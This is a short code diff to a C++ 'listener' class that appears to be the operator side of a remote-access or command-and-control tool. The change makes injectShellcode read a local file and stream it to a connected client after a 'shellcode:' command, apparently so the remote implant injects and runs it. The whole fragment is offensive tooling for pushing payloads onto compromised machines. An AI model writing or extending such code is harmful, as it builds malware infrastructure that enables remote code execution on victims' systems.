@@ -154,10 +154,32 @@ int listener::uploadFile(string l_path, string r_path) {
 	printf("Finished Uploading!\n");
 }
 
-int listener::injectShellcode() {
+int listener::injectShellcode(string l_path) {
 	printf("Injecting Shellcode...\n");
+	std::streampos filesize = 0;
+	ifstream in(l_path, std::ios::binary);
+	char* sendbuf = new char[1024];
+	int sendbuflen = 1024;
+	memset(sendbuf, '\0', sendbuflen);
+	
 	string cmd = "shellcode:";
 	send(new_fd, cmd.c_str(), cmd.length(), 0);
+
+	while (in.is_open()) {
+		printf("File is open\n");
+		in.read(sendbuf, sendbuflen);
+		if (in.eof()) {
+			printf("End of file\n");
+			send(new_fd, sendbuf, sendbuflen, 0);
+			memset(sendbuf, '\0', sendbuflen);
+			in.close();
+		} else {
+			printf("Sending file\n");
+			send(new_fd, sendbuf, sendbuflen, 0);
+			memset(sendbuf, '\0', sendbuflen);
+		}
+	}
+	printf("Finished Uploading Shellcode!\n");
 }
 
 string listener::print(){
